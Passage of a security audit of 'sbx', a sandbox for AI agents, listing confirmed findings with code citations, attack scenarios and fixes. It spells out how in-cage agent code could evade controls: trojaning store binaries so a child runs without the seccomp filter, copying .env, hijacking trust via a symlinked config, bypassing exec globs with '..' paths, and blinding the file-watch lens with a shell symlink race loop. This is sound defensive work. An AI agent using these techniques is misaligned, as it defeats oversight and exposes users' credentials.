| **Gravité** | Élevée |
| **Emplacement** | `src/sandbox/launch.rs:3980` |
| **Catégorie** | `policy-bypass` |
| **Sous-système** | Pipeline de lancement et argv bwrap |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `[proc] mode = enforce|ask` and `[fs] scan` are both enforced by one in-cage seccomp-user-notify shim, registered as `WrapLayer::ProcEnforce` — the *innermost* wrap (launch.rs:3979-3982, ordering at launch.rs:5921-5944). Every other wrap therefore runs a preamble *before* the filter exists: `WrapLayer::Egress` (launch.rs:4492-4502) runs `egress::wrap_command(&prep.userland.socat_bin, &prep.userland.shell_bin, …)`, which becomes `<shell_bin> -c "<socat …> & …; exec \"$@\""`; `MiseEquip` (4018/4054) runs `<mise_bin>`; `FlakeEquip` (4105) runs `<nix_bin>`; `Forward`, `CaTrust` and `Portal` likewise.

Those four paths are plain `/nix/store/<hash>-…/bin/…` strings (launch.rs:4022-4023, 4109-4110, 4166-4167, 4496-4497) resolved *inside the cage*, and the cage's `/nix` is the per-project store bound **read-write** (`binds::NixMount { writable: true }`, launch.rs:3843-3854). `projectstore::copy_recursive` creates every directory of every seeded store path with `DIR_MODE = 0o700` (projectstore.rs:72, 378) owned by the launching uid, and the cage runs same-uid — so in-cage code can `rm`/replace `/nix/store/<hash>-bash-*/bin/bash` or `…-socat-*/bin/socat` outright. `seed_path` skips any path that already exists (`if dest.symlink_metadata().is_ok() { return Ok(()); }`, projectstore.rs:328-330), so the replacement is never re-copied or verified on later launches.

The comment at launch.rs:3869-3871 documents *why* the shim is innermost ("not the provisioning and egress plumbing wrapped around it"), but that reasoning silently assumes the plumbing is sbx's own bytes. It is not. Elsewhere in the same tree sbx explicitly binds its own in-cage assets read-only for exactly this reason ("Read-only so the agent cannot rewrite sbx's own plugin code", binds.rs:487-492; "so the agent cannot rewrite its own shell init", binds.rs:493-499) — the plumbing binaries were missed. `open_policy.rs:1` claims the lens decides "which file contents an in-cage agent may be handed"; that claim does not hold.

**Scénario.** Session 1 (any ordinary agent session, no enforcement needed): the agent overwrites `/nix/store/<hash>-socat-*/bin/socat` in its writable `/nix` with a payload that first does the real socat work and then forks a background helper. Session 2, launched with `[proc] mode = "enforce"` and `[fs] scan = ["AKIA[0-9A-Z]{16}"]` under any allowlist posture: `build` registers the Egress wrap outside the ProcEnforce wrap, so the cage's first process is `<shell_bin> -c '<socat> … & …; exec "$@"'`. The trojaned socat runs and forks *before* `/opt/sbx/proc-shim` installs the seccomp filter, so that child carries no filter for the whole session. From it the agent (a) execs anything the `[proc]` allowlist forbids, and (b) reads `<project>/.env` and copies it to `/home/sandbox/.cache/x` — outside the lens's project-root bound (proc_enforce.rs:2396-2406) — then reads it back from the enforced process, with the content scan never having seen either open. Both configured protections report as active and neither fires.

**Correction proposée.** Make the plumbing the cage cannot rewrite, in `build`: push read-only re-binds of `prep.userland.{shell_bin,socat_bin,mise_bin,nix_bin}`'s store-path roots into `extra_binds` (they are emitted after the `/nix` mount, so they shadow the writable copies) before the wraps are composed. Alternatively move `WrapLayer::ProcEnforce` outermost and have `proc_enforce::start` pre-authorize those exact absolute paths, so the exemption is granted to named sbx binaries rather than to a position in the exec chain.

**Rectification du vérificateur.** Mechanism confirmed, with three corrections. (1) The attack needs no earlier unenforced session: neither the exec policy nor the open lens gates *writes*, and the lens is read-side only (proc_enforce.rs:2392-2410), so the trojan can be planted from inside the very session that is being enforced and cashed in on the next launch. (2) The severity is bounded by scope: the trojaned preamble child is still inside the cage's real boundaries — empty netns, bind/mask policy, base seccomp — so this defeats the `[proc]` policy and the `[fs] scan` lens, not the cage. proc_enforce.rs:110-115 already says exec enforcement 'is not a full containment boundary … a guardrail with real teeth on the exec channel'. (3) That same sentence names 'the read-only store' as one of the cage's actual boundaries, which is false for every per-project store launch — that comment, and 'the read-only store' at proc_enforce.rs:2399, assert a property the code does not have and are worth fixing alongside the binds.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every cited line checks out and I found no guard on the path. `wraps.push((WrapLayer::ProcEnforce, …))` is at launch.rs:3979-3982 and `WrapLayer` orders ProcEnforce innermost (launch.rs:5921-5944, and the enum doc at 5923-5925 states the intent). The egress wrap is registered at launch.rs:4492-4502 with `&prep.userland.socat_bin, &prep.userland.shell_bin`, and `egress::wrap_command` (egress.rs:192-213) builds `<bash> -c "<socat …> & …exec \"$@\""` via `wrap_background` (egress.rs:633-649) — so the cage's argv[0] and a backgrounded socat both run before the shim execs. Those paths resolve inside the cage against `/nix`, which is bound read-write: launch.rs:3843-3854 constructs `binds::NixMount { src: <project>/store/nix, writable: true, .. }` and binds.rs:406-418 emits `Mount::Bind` (not `RoBind`) for it. The cage runs same-uid (argv.rs:103-131), and the seed creates every store directory owner-writable — projectstore.rs:72 `const DIR_MODE: u32 = 0o700;`, used at projectstore.rs:378 in `copy_recursive` — so replacing `<hash>-bash-*/bin/bash` needs only write on a 0700 directory the launching uid owns. `seed_path` returns early on an existing path (projectstore.rs:326-330) and `prepare` (projectstore.rs:222-275) never verifies content, so the replacement persists across launches. I grepped binds.rs for a read-only re-bind of `shell_bin`/`socat_bin`/`mise_bin`/`nix_bin`: there is none — only `Mount::Symlink` for /bin/sh and /bin/bash (binds.rs:424-438), which point *into* the writable store.

</details>

---

### S5 — Trust marker is keyed on the symlink-resolved config path, so a symlinked `.sbx.toml` inherits another project's trust verdict
| | |
|---|---|
| **Gravité** | Élevée |
| **Emplacement** | `src/trust.rs:189` |
| **Catégorie** | `trust-store-bypass` |
| **Sous-système** | Plugins — confiance et chaîne d'approvisionnement |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `canonical_string` resolves the config path with `config_path.canonicalize()` (src/trust.rs:189), which is `realpath(3)` and resolves the *final* component as well as its parents. `marker_path` then hashes that string to name the marker (src/trust.rs:212: `let key = hash_bytes(canonical_string(config_path)?.as_bytes());`), and `verdict_for_hash` (src/trust.rs:220-246) looks that marker up and compares only the stored content hash — it reads `contents.lines().nth(1)` and never checks the canonical-path line the marker records against the path actually being judged.

The bytes that are hashed and parsed come from `crate::config::safety::read_safe_bytes(config_path)` (src/trust.rs:254 and src/config/load.rs:521). That opens with `O_RDONLY|O_NONBLOCK` and *no* `O_NOFOLLOW`, so it follows the leaf symlink too and `fstat`s the target — an attacker-planted symlink whose target is a user-owned, non-world-writable file passes the gate cleanly (symlink modes are meaningless on Linux).

Meanwhile the directory the resolved config is *applied* to is the launch's `cwd`, not the config's parent: `read_project(cwd, ..)` joins `cwd.join(PROJECT_CONFIG)` and the project root used for bind nesting is `cwd.canonicalize()` (src/config/load.rs:181). So the identity the trust marker is keyed on and the tree the config governs are allowed to be two different directories, and nothing reconciles them.

Everything a `Trusted` verdict unlocks is a security field: `[[secret]]` credentials, `[network] allow`, `binds`, `gui`/`gpu`/`audio`/`portal`, `[limits]`, the exec policy and `use` bundles (see the gating at src/config/load.rs:95 and the field docs from src/config/mod.rs:300 onward).

**Scénario.** The user has already run `sbx trust` on a real project config, say `~/src/.sbx.toml`, carrying `[[secret]] from = "env://CORP_TOKEN", to = "api.corp.internal"`, `[network] allow = ["api.corp.internal"]` and `binds = ["~/.aws"]`. A hostile repository ships its `.sbx.toml` as a git symlink — git stores symlinks, so `.sbx.toml -> ../.sbx.toml` survives a clone — and deliberately ships no mise file. The user clones it to `~/src/evil` and runs `sbx` there.

`read_safe_bytes(~/src/evil/.sbx.toml)` follows the link and returns the trusted project's bytes. `mise_inputs_for` looks beside `~/src/evil/.sbx.toml`, finds no mise file, so `content_hash` takes the no-mise fast path and equals `hash_bytes(trusted bytes)` — byte-identical to what the marker recorded. `canonical_string` resolves to `/home/u/src/.sbx.toml`, so `marker_path` names the *trusted project's* marker, whose stored hash matches. Verdict: `TrustState::Trusted`.

The launch then runs the hostile repository's agent, in the hostile repository's tree (bound read-write), with another project's security posture: `CORP_TOKEN` is resolved host-side and injected into every request to `api.corp.internal`, that host is on the egress allowlist, and `~/.aws` is bound into the cage. The attacker never had to get a config of their own approved — one symlink whose target path they guessed (`../.sbx.toml`, `../../.sbx.toml`, or a well-known project directory) transfers the whole verdict. No warning is emitted, because from the gate's point of view nothing is wrong.

**Correction proposée.** Never canonicalize the leaf component. In `canonical_string`, always take the branch that is currently only the fallback: canonicalize `config_path.parent()` and re-append `config_path.file_name()`. That keeps the parent-symlink normalization the doc comment actually needs (so `sbx trust` with the file present and a later `sbx untrust` with it deleted still derive the same key) while making the marker key the path the user is standing in rather than wherever a symlink points. Belt-and-braces: have the config safety gate open with `O_NOFOLLOW`, or `symlink_metadata` the config in `trust::state`/`verdict_for_hash` and treat a symlinked `.sbx.toml` as `Untrusted`.

**Rectification du vérificateur.** Two refinements. (1) The auditor's mise caveat is stated backwards and is weaker than they think: what matters is that the *target* project has no mise file (a mise file beside the target would be hashed into its marker but not found beside the hostile config, yielding `Changed`) — and even that is escapable, because `mise_files_for` (src/trust.rs:71-78) only tests `p.exists()`, which follows links, so the attacker can ship `mise.toml -> ../mise.toml` alongside and reproduce the framed hash exactly. (2) The attacker does not choose the config's *contents*, only which trusted config gets applied; the gain is that the victim's other project's posture (secrets, `[network] allow`, `binds`) is applied to a cage whose project root is the hostile repo, plus the reverse trick of pointing at any config the user has ever trusted. Path guessing is the only real cost and a broken link is a harmless no-op, so the attempt is free.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every step of the chain checks out. src/trust.rs:189 is exactly `let resolved = config_path.canonicalize().unwrap_or_else(|_| {` — realpath, leaf included — and src/trust.rs:212 keys the marker on `hash_bytes(canonical_string(config_path)?.as_bytes())`. src/trust.rs:220-246 (`verdict_for_hash`) reads only `contents.lines().nth(1)` (the hash) and never compares the marker's line 1 (the canonical path it was recorded for) against the path being judged; line 1 is written at src/trust.rs:352 (`let body = format!("{canonical}\n{hash}\n")`) and is otherwise display-only. The read gate does follow the leaf link: `read_safe_bytes` (src/config/safety.rs:73-87) opens with only `O_RDONLY|O_NONBLOCK` — no `O_NOFOLLOW` — and `verdict` (src/config/safety.rs:22-36) fstats the *target*, so a link to a user-owned, non-world-writable file passes. The identity/scope split is real: `read_project` reads `cwd.join(PROJECT_CONFIG)` (src/config/load.rs:520) and passes that same path to `trust::verdict_for_hash` (src/config/load.rs:543), while the tree the config governs is `cwd` (src/config/load.rs:181 canonicalizes cwd only for bind-nesting warnings). I grepped the whole tree for a leaf-symlink guard on the project config (`symlink_metadata`/`is_symlink`/`O_NOFOLLOW` in src/trust.rs, src/config/*.rs, src/main.rs, tests/) and there is none, and no test documents this as intended. Nothing stops the traced path.

</details>

---

### S6 — Exec targets are matched as the raw, unresolved path string, so `..`/`//`/relative spellings walk through a path-glob allow or deny rule
| | |
|---|---|
| **Gravité** | Élevée |
| **Emplacement** | `src/proc_policy.rs:113` |
| **Catégorie** | `allowlist-bypass` |
| **Sous-système** | Seccomp et politique d'exec |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `ProcRule::matches` globs the exec target exactly as the cage spelled it (`let subject = if self.on_path { path } else { basename }`), and nothing upstream normalises it. `exec_verdict` (src/sandbox/proc_enforce.rs:638-660) reads the pathname straight out of the parked target's memory with `read_exec_path` and hands that string to `cx.overlay.decide(cx.policy, caller, &path)` — no lexical cleanup of `//`, `/./` or `..`, and no resolution of a relative pathname against the target's cwd or `execveat`'s `dirfd` (`exec_args` at :2054 returns the dirfd, and `exec_verdict` only consults it when the pathname is *empty*). The kernel, meanwhile, resolves all of those spellings. The module has the machinery to do this correctly — `open_target_path` (:2811) resolves a notified *open* through `/proc/<pid>/root`, `/proc/<pid>/cwd` and `/proc/<pid>/fd/<dirfd>` — it is simply never applied to the exec path. The `[proc]` docs advertise the affected rule form ("a rule **with** `/` matches the **full exec path**: `/usr/bin/*`, `/nix/store/*/bin/git`") and use `allow = [..., "/nix/store/*"]` as the worked example, and `resolve_spawn_entry` in src/sandbox/task.rs:1544 passes any entry containing `/` through verbatim while its own error text tells the user to write globs as `/nix/store/*/bin/tool`.

**Scénario.** Allowlist direction (the severe one), a task under `ProcMode::Confine` with `[exec."/opt/build.sh"] spawn = ["/nix/store/*/bin/cc"]`: the declared program — untrusted code, which is the whole reason the graph exists — calls `execve("/nix/store/../../tmp/evil/bin/cc", ...)`. `glob_match("/nix/store/*/bin/cc", "/nix/store/../../tmp/evil/bin/cc")` returns true because `*` swallows `../../tmp/evil`, so `decide_chain` returns `Verdict::Allow`, the supervisor answers `CONTINUE`, and the kernel resolves the path to `/tmp/evil/bin/cc` and runs the attacker's binary. The same trick lifts `ask`-mode `allow = ["/nix/store/*"]`. Denylist direction, `[proc] mode = "enforce", deny = ["/usr/bin/*"]`: `execve("//usr/bin/curl")` or `execve("/tmp/../usr/bin/curl")` fails the literal prefix match, falls to `unmatched()` = `Allow`, and curl runs. Same for `deny = ["/usr/bin/curl"]` defeated by `chdir("/usr/bin"); execve("curl", ...)` or `execveat(dirfd_of_usr_bin, "curl", argv, envp, 0)` — the rule contains `/` so it is matched against the whole path, and the whole path is the bare string `curl`.

**Correction proposée.** Resolve the notified exec target to an absolute, lexically normalised in-cage path before matching, using the resolution this module already performs for opens: join a relative pathname onto `/proc/<pid>/cwd` (for `execve`/`AT_FDCWD`) or `/proc/<pid>/fd/<dirfd>` (for `execveat`), read the result back through `/proc/self/fd/<n>`, and collapse `//`, `/.` and `..` before calling `ProcPolicy::decide`. Failing that, at minimum normalise the string lexically in `ProcRule::matches`/`decide_chain` and treat a target that is still not absolute after normalisation as unmatched (`Deny` under `confine`, and refuse to let it silently miss a path `deny` under `enforce`).

**Rectification du vérificateur.** The mechanism is confirmed, but two halves of the attack have different reach. Allow direction: an EXACT path rule is not bypassable (with no `*` the glob is literal, so a crafted spelling cannot match `/usr/bin/env`); the bypass needs a `*` in the rule, e.g. `/nix/store/*/bin/cc` — which is precisely the form the docs' worked example and `resolve_spawn_entry`'s own error hint (src/sandbox/task.rs:1561-1562, '`a glob has to be written as a path (/nix/store/*/bin/tool)`') steer authors toward, so it is the realistic case rather than an exotic one. Deny direction: only path-form rules are affected. A basename rule — `deny = ["curl", "ssh"]`, the form both the config docs and the shipped examples use — still catches `//usr/bin/curl`, `/tmp/../usr/bin/curl` and `chdir("/usr/bin"); execve("curl")`, because `basename()` (src/proc_policy.rs:281-286) takes the final component of the raw string and it is still `curl`. So the finding is not 'all deny rules are bypassable'; it is 'every rule containing a `/` is matched against a spelling the kernel will re-resolve'. Also worth adding to the fix note: the same unresolved string is what the ring records and what `sbx proc logs` prints, so docs-site/docs/guide/configuration/proc.md:96 ('shows the resolved exec path') is itself inaccurate.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every cited line is real and says what the auditor claims. src/proc_policy.rs:113 is `let subject = if self.on_path { path } else { basename };` and `glob_match` (src/proc_policy.rs:288-320) gives `*` no path-separator meaning, so `*` swallows `../..`. src/sandbox/proc_enforce.rs:638 hands `read_exec_path`'s raw string straight to `cx.overlay.decide(cx.policy, caller, &path)` at :655; `read_exec_path` (:2016-2018) is `String::from_utf8(read_path_bytes(...))` and does nothing else. `exec_args` (:2054) does return the dirfd, and `exec_verdict` consults it only inside the `.or_else(...)` reached when the pathname is empty (:645-657) — a relative-but-nonempty pathname is never joined to `/proc/<pid>/cwd`. The machinery exists and is applied only to opens: `open_target_path` (:2811-2828) joins a relative path onto `/proc/<pid>/cwd` or `/proc/<pid>/fd/<dirfd>`, and is called only from the open paths (:1290, :1454, :2478, :2526, :2538). I looked for an upstream guard and found none: proc-shim/src/main.rs installs the filter and never inspects arguments; there is no lexical normaliser anywhere in the tree (grep for normalis/normaliz/lexical returns nothing in this path); the module header's 'Bypass resistance' section (:66-107) enumerates compat-ABI, execveat, self-installed filters and `#!` interpreters and never mentions path spelling; and the docs' 'Honest scope' (docs-site/docs/guide/configuration/proc.md:65-88) lists in-process harm, allow-TOCTOU and the ptrace-ancestor case, not this. The confine path is reachable and documented: docs-site/docs/guide/tasks/execution.md:127 states 'A pattern may still appear in a `spawn` list', and src/sandbox/task.rs:1544 returns any entry containing `/` verbatim.

</details>

---

### S7 — `fs_watch::add_tree` follows a symlink when installing a watch, letting the cage push the inotify watch set outside the project and blind the observation lens
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/fs_watch.rs:235` |
| **Catégorie** | `toctou` |
| **Sous-système** | Binds, masques et politique de fichiers |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `add_tree` claims: "Symlinks are not followed (an entry's type is read without traversing it), so the watch set cannot loop or escape the project tree" (fs_watch.rs:228-229). That holds only for the enumeration step (`entry.file_type()` at line 258, which does not traverse). It does not hold for the two path-based operations applied to the directory being processed:

```rust
match add_watch(self.fd, &dir) {          // line 235
...
let Ok(entries) = std::fs::read_dir(&dir) // line 247
```

`add_watch` calls `inotify_add_watch(fd, path, WATCH_MASK)` (fs_watch.rs:192) and `WATCH_MASK` (fs_watch.rs:73-81) does not include `IN_DONT_FOLLOW`, so the kernel resolves the path through symlinks; `IN_ONLYDIR` only requires the RESOLVED target be a directory. `std::fs::read_dir` follows symlinks too.

The directory handed to `add_tree` for a post-start subtree comes from `handle_event`: `Class::New { is_dir: true } => { … self.add_tree(&full, true) }` (fs_watch.rs:302-307), where `full = dir.join(name)` is re-resolved at the moment `add_tree` runs — not the inode the kernel reported `IN_CREATE|IN_ISDIR` for. The watcher polls with a 250 ms timeout and drains a queue (fs_watch.rs:340-370), so the window between the kernel queuing the event and `add_tree` resolving the path is wide and fully observable to the writer. The same window exists inside `add_tree` between `stack.push(path)` (line 263) and the `add_watch` that later pops it.

**Scénario.** The cage runs untrusted code and the project tree is bound read-write at its own host path — the tree the supervisor watches. With `--observe` on, the agent runs inside the cage:

```sh
while :; do mkdir X; rmdir X; ln -s / X; rm X; done
```

One iteration wins: the kernel queues `IN_CREATE|IN_ISDIR` for `X`, and by the time the 250 ms poll fires, `<project>/X` is a symlink to `/`. `add_tree("<project>/X", true)` calls `inotify_add_watch` on it, which follows the link and watches the host root, and `read_dir` lists `/`. Every entry is pushed as a synthetic create with rel `X/etc`, `X/home`, …, and every real directory reached through the link is pushed onto the stack, so the walk recurses over the entire host filesystem.

What the agent gets: (1) inotify watch-descriptor exhaustion — the walk runs until ENOSPC, consuming the host-wide per-user `fs.inotify.max_user_watches` budget (breaking the user's editors and file-sync alongside sbx) and permanently blinding this session's lens, since `warn_limit_once` latches and every later `add_tree` for a genuine new project directory then fails; (2) the 1000-entry ring (`FS_RING_CAP`) is flooded with synthetic creates for host paths, evicting the record of what the agent actually wrote — the audit trail `sbx fs logs` exists to produce; (3) host directory names from outside the project are reported to the operator as project-relative paths, and after the escape any other process's writes anywhere on the host are reported as project writes. The lens is documented as "not a boundary", but its stated blind spots are a fixed ignore list; being able to switch it off on demand, forge its contents, and escape the project tree are not among them — the last is explicitly said to be impossible.

**Correction proposée.** Add `libc::IN_DONT_FOLLOW` to `WATCH_MASK` (fs_watch.rs:73-81). `inotify_add_watch` then fails with ELOOP on a symlinked path, and because the non-ENOSPC error arm at fs_watch.rs:245 does `continue` BEFORE the `read_dir` at line 247, that one flag closes both the watch and the enumeration. Optionally also check `std::fs::symlink_metadata(&full).map(|m| m.is_dir())` in `handle_event` before calling `add_tree`, so the skip is explicit rather than a side effect of the mask, and correct the claim at fs_watch.rs:228-229 to describe what is actually enforced.

**Rectification du vérificateur.** Mechanism holds; three refinements. (a) The sample loop as written (`ln -s / X; rm X`) removes the symlink again — the working form is `mkdir X; rmdir X; ln -s / X` and then stop, leaving the link in place so the subsequent `add_watch`/`read_dir` resolve through it. (b) The "blinding" consequence is only partly new: the header already documents `.git`, `node_modules`, `target`, `.venv` as an *exploitable* blind spot the agent can write into unobserved (fs_watch.rs:24-28), so evading the feed is already free. What is genuinely new is (i) the escape itself, which the code claims is impossible, (ii) consumption of the host-wide per-uid `fs.inotify.max_user_watches` budget by the *host supervisor* on the cage's behalf — a resource the cgroup limits do not cover — and (iii) forged project-relative paths for host directories. (c) One extra corruption the finding misses: `inotify_add_watch` returns the *existing* wd when the resolved inode is already watched, so walking back into the real project through the link (e.g. `X/home/user/project`) makes `self.wd_paths.insert(wd, ...)` at fs_watch.rs:237 overwrite the genuine mapping with a bogus `X/...` prefix, mislabelling subsequent real events. Medium is the right severity: the lens is an observability feature, not the boundary.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Every cited line checks out. WATCH_MASK (fs_watch.rs:73-81) contains IN_ONLYDIR and IN_EXCL_UNLINK but not IN_DONT_FOLLOW, so `inotify_add_watch` (fs_watch.rs:192) resolves the path through symlinks and IN_ONLYDIR only constrains the resolved target. `add_tree` applies two path-based operations to the popped directory — `add_watch(self.fd, &dir)` at fs_watch.rs:235 and `std::fs::read_dir(&dir)` at fs_watch.rs:247 — while the non-traversing `entry.file_type()` check (fs_watch.rs:258) only protects the enumeration step, so the doc claim at fs_watch.rs:228-229 ("Symlinks are not followed ... so the watch set cannot loop or escape the project tree") is false for the post-start path. `handle_event` re-resolves `full = dir.join(name)` and calls `self.add_tree(&full, true)` on `Class::New { is_dir: true }` (fs_watch.rs:302-307), and the loop polls with a 250 ms timeout (fs_watch.rs:349), so the swap window is wide and retryable. The watcher runs host-side on the project's own host inode (observe_feed.rs:286), which the cage holds read-write. The module header's blind-spot list (fs_watch.rs:10-34) documents the ignore set, IN_CLOSE_WRITE semantics, stale rename paths and multi-writer visibility — it does not document watch-set escape, which add_tree's own doc explicitly denies.

</details>

---

### S8 — Broker spawns a plugin sandbox and dials the host resource before the cage sends its first frame, with no churn limit
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/sandbox/broker.rs:1268` |
| **Catégorie** | `resource-exhaustion` |
| **Sous-système** | Brokers de credentials (ssh-agent, signer) |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `serve_conn` draws a marker, then does `PluginProcess::start(bwrap, plugin, allow, marker)` — a full `bwrap` spawn plus a handshake round trip — and then opens the connection to the host resource, all before `serve_exchanges` reads anything from the cage. `MAX_CONCURRENT_CONNS` (1126) caps *concurrency* at 32, and `ConnCap` (src/sandbox/conncap.rs:67) is purely a live-slot counter with no rate or churn control; the accept loop (1673-1712) spawns a thread per accepted connection with no other throttle.

The `CAGE_FIRST_FRAME` comment (1408-1413) states the problem exactly — "Everything a connection stands up — the plugin process, the connection to the host resource, a thread, one of `MAX_CONCURRENT_CONNS` slots — is already standing before the cage has said anything" — but the mitigation chosen (a 30 s silence deadline) only addresses a connection that *holds* a slot, not one that connects and immediately closes. The sibling broker gets the ordering right: `sshagent::serve_conn` (src/sandbox/sshagent.rs:657-694) reads the first message under its deadline and only then does `UnixStream::connect(host_sock)`, with the comment "before anything is stood up for this connection — so a cage that connects and says nothing holds neither a connection to the user's own agent nor a slot". And `src/sandbox/deadline.rs:9-12` notes that this cost lands outside the cage's own limits: "threads parked host-side are outside the cage's cgroup, so the host pays for them where the sandbox's own limits do not reach."

**Scénario.** A launch declares `[broker.gpg-agent]`, so `/tmp/sbx-broker-gpg-agent/S.gpg-agent` (or the `at_host_path` address) is bound into the cage. Hostile in-cage code runs `while :; do for i in $(seq 32); do (exec 3<>/dev/unix-socket; ) & done; done` — in practice a tight loop of `connect()` immediately followed by `close()`, 32 in flight. Every one of those zero-byte connections costs the host a `bwrap` spawn (new user/mount/pid namespaces), a plugin process start, a handshake write+read, and a `connect()` to the real gpg-agent, before `read_frame` returns EOF and the handler unwinds. The cage never trips `CAGE_FIRST_FRAME` because it never stays connected. The result is sustained host-side process creation at whatever rate the machine allows, driven by a workload whose own cgroup limits do not cover it: host CPU is consumed, the PID table and the host resource's own connection table are churned, and the user's real gpg-agent is hammered with connect/disconnect. Nothing in the record marks it — the ceiling path at 1683 is a bare `continue` with no ring event.

**Correction proposée.** Reorder `serve_conn` to match `sshagent::serve_conn`: read the cage's first frame under the existing `CAGE_FIRST_FRAME`/`host_deadline` budget first (passing it into `serve_exchanges` as the already-read frame, the way `collect_reply` already accepts a `first`), and only then call `PluginProcess::start` and open the host connection. A connection that closes without speaking then costs an accept and nothing else. Additionally, record the ceiling refusal at line 1683 in the ring the way `sshagent::serve` does (sshagent.rs:730-734), so an operator can see the pressure.

**Rectification du vérificateur.** Two corrections to the auditor's framing. (1) The proposed reorder is not universally applicable: `spec.host_greets` (broker.rs:1656-1660) requires the host greeting to be read and ruled on *before* the cage's first frame, so for greeting protocols (gpg-agent) the plugin and host connection must stand first by construction; the fix has to be conditional on `!spec.host_greets`. (2) The impact is throughput amplification, not unbounded growth — at most 32 bwrap processes and 32 host connections exist at any instant; what is unbounded is the *rate* of spawn/teardown, paid host-side outside the cage's cgroup (the cost class src/sandbox/deadline.rs:9-12 names). Availability only; no credential or policy consequence.

<details>
<summary>Preuve retenue par le vérificateur</summary>

Traced and confirmed. src/sandbox/broker.rs:1269 calls `PluginProcess::start(bwrap, plugin, allow, marker)` as the first substantive act of `serve_conn`, and `PluginProcess::start` (1005-1055) really does `Command::new(bwrap).spawn()` plus a handshake write+read (`me.handshake(...)`, 1053); the host connection follows at 1275-1289; only then does `serve_exchanges` (1349) reach the cage read at 1423-1443. src/plugins/broker.rs confirms the cost is per-connection ("`exec` is run once per cage connection"). src/sandbox/conncap.rs:53-81 is a bare live-slot counter — `take()` is fetch_add/compare with no rate, no churn, no backoff — so `MAX_CONCURRENT_CONNS` (broker.rs:1126) bounds only what is in flight, never the rate. The `CAGE_FIRST_FRAME` comment at broker.rs:1408-1413 mitigates only a connection that *holds* a slot; a connect/close pair never reaches the deadline. The sibling really does get it right: sshagent.rs:657-694 reads the first message under `Deadlined` and connects to the host agent only at line 694, with the comment at 658-660 giving that exact reason. The secondary point is also correct: broker.rs:1683 is `let Some(slot) = cap.take() else { continue };` with no ring push, where sshagent.rs:727-734 pushes "a connection beyond the broker's concurrency ceiling".

</details>

---

### S9 — `union_allow_opt` silently discards the higher tier's `[ssh_agent] confirm`, breaking the documented "confirm can never be turned off by another layer" rule
| | |
|---|---|
| **Gravité** | Moyenne |
| **Emplacement** | `src/config/overrides.rs:709` |
| **Catégorie** | `policy-fail-open` |
| **Sous-système** | Configuration et secrets |
| **Statut** | confirmé par réfutation adversariale (confiance de l'analyste : haute) |

**Constat.** `union_allow_opt` is used for `[seccomp]`, `[devices]` and `[ssh_agent]` (overrides.rs:646-648). It moves the higher tier's `allow` entries onto the base and returns `Some(b)` — the BASE value — so every other field of the higher tier's table is dropped. Its doc calls the argument "two optional `{ allow: Vec<String> }` tables", true for `RawSeccomp` and `RawDevices` but not for `RawSshAgent`, which also carries `confirm: Option<bool>` (schema.rs:713) whose own doc says it is "Fail-closed in every direction: [...] the flag ORs across layers — a layer that asks for confirmation cannot have it turned off by another."

When two tiers both declare `[ssh_agent]`, the higher tier's `confirm` never reaches `Resolved::apply_override`, whose `self.ssh_agent_confirm |= confirm` (mod.rs:1158, commented "the one place it must not be possible to *remove* it is the most convenient one to try") therefore ORs in `false`. The asymmetry is backwards: a lower-tier `confirm = true` survives (it lives on `b`), while the higher-precedence, more explicit one is thrown away.

**Scénario.** A developer's shell has `SBX_CONFIG='[ssh_agent]` + `allow = ["deploy-key"]'` (a standing grant from a bootstrap script or CI image). Before handing an agent an untrusted repo they deliberately tighten the run: `sbx run --config '[ssh_agent] allow = ["deploy-key"]` + `confirm = true'`, expecting a desktop prompt per signature. `collect_from` builds `env_side` from `SBX_CONFIG` and `cli_side` from the blob, then `overlay_into(env_side, cli_side)` calls `union_allow_opt(Some(env_table), Some(cli_table), ...)`, which keeps the env table (`confirm: None`) and copies only the CLI's `allow` entries in. The merged override carries `confirm = None`; `apply_ssh_agent` returns `confirm = false`; `self.ssh_agent_confirm |= false` leaves it off. The cage can now ask the host agent to sign with `deploy-key` — authenticating as the user to every host that trusts it — with no prompt, contrary to the flag the user explicitly typed.

**Correction proposée.** Stop treating `[ssh_agent]` as an allow-only table. Either give it its own fold that unions `allow` and ORs `confirm` (`b.confirm = match (b.confirm, h.confirm) { (Some(true), _) | (_, Some(true)) => Some(true), (a, c) => c.or(a) }`), or make `union_allow_opt` take a second closure for the non-list fields and destructure `RawSshAgent` exhaustively the way `union_fs_opt` does for `RawFs`, so the next field added is a compile error rather than a silent drop.

**Rectification du vérificateur.** Two corrections to the mechanism. First, it only bites when BOTH sides declare an `[ssh_agent]` table: `union_allow_opt`'s `(None, h) => h` arm (overrides.rs:705) passes a lone higher-tier table through intact, so `--config '[ssh_agent] confirm = true'` works fine unless something else also declared the table. Second, the ambient-env framing is not needed — the same drop happens purely on the command line, since repeated `--config` blobs are folded through the identical `overlay_into` (collect_from, overrides.rs:337-343), so blob #1 carrying `allow` and blob #2 carrying `confirm = true` loses the confirm. Impact is defence-in-depth loss rather than a new grant: the key `allow` list still has to have been granted by some tier for the agent to exist at all.

<details>
<summary>Preuve retenue par le vérificateur</summary>

